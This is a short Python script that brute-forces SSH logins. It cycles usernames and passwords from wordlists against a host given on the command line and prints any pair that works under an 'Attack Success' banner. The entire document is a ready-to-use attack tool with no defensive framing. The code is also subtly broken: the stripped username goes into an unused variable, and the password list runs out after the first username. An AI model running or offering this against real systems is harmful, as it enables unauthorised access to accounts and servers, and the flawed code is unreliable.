from pwn import *
import paramiko,sys

host = sys.argv[1]
uname_file = sys.argv[2]
passwd_file = sys.argv[3]
ssh_port = sys.argv[4] if len(sys.argv) > 4 else 22
attempts = 0



with open(uname_file,'r') as uname_list:
	with open(passwd_file,'r') as passwd_list:
		for uname in uname_list:
			for passwd in passwd_list:
				unam = uname.strip('\n')
				passwd = passwd.strip('\n')
				try:
					response = ssh(host=host,user=uname,password=passwd,port=int(ssh_port), timeout=5)
					print('[{}] Attepting Username: {} and Password: {}'.format(attempts,uname,passwd))
					if response.connected():
						print("Attack Success\nUsername: {} ,Password: {}".format(uname,passwd))
						response.close()
						break
					response.close()
				except paramiko.ssh_exception.AuthenticationException:
					print ("[X] Invalid Password")
					attempts += 1
				except paramiko.ssh_exception.NoValidConnectionsError:
					print("Invalid Port {}".format(ssh_port))
					exit(5)

